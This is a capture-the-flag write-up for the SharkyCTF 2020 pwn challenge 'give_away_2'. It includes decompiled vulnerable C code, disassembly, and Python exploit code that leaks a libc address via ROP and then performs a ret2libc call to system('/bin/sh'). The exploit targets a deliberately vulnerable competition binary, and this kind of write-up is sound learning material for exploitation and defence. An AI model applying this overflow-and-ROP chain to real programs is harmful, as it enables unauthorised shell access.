
## give_away_2
### Description

> Make good use of this gracious give away.
>
> Creator: Hackhim


### Attachment

[give_away_2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_2/give_away_2)
, 
[libc.so.6](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_2/libc.so.6)

### Analysis

the last warm up task

```c
int main(int argc, const char **argv, const char **envp){
  init_buffering(&argc, argv, envp);
  printf("Give away: %p\n", main);
  vuln();
  return 0;
}
char *vuln(){
  char s; // [rsp+0h] [rbp-20h]
  return fgets(&s, 128, stdin);
}
```

> buffer overflow, no canary, address of `main` was leaked

### Solution

#### leak libc

re-call `printf` to print address of got entry of `printf` 

```nasm
0x00000880      b800000000     mov eax, 0             # call here
0x00000885      e806feffff     call sym.imp.printf 
0x0000088a      b800000000     mov eax, 0
0x0000088f      e8adffffff     call sym.vuln
0x00000894      b800000000     mov eax, 0
0x00000899      5d             pop rbp
0x0000089a      c3             ret
```

after leak `printf` in libc, `vuln` function would be called again

```python
# leak
ru('Give away: ')
main = eval(rc(14))
info_addr('main',main)
text = main - 0x000864
info_addr('text',text)
printf = text + 0x880
printf_got = text + 0x200fc0
bssbase = elf.bss()+0x800 + text

# gadget
prdi = 0x0000000000000903 + text # pop rdi ; ret
prsi_r15 = 0x0000000000000901 + text

# rop1
offset = 40-8
payload = 'A'*offset
payload += p64(bssbase)
payload += p64(prdi) + p64(printf_got) + p64(printf)

rc()
sl(payload)
printf_libc = uu64(rc(6))
info_addr('printf_libc',printf_libc)
libcbase = printf_libc - libc.sym['printf']
info_addr('libcbase',libcbase)
system = libcbase + libc.sym['system']
info_addr('system',system)
binsh  = libcbase + libc.search('/bin/sh').next()
info_addr('binsh',binsh)
```

#### ret2libc

```python
# rop2
offset = 40-8
pl2 = 'A'*offset
pl2 += p64(bssbase)
pl2 += p64(prdi+1) + p64(prdi) + p64(binsh) + p64(system)
sl(pl2)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/give_away_2) 


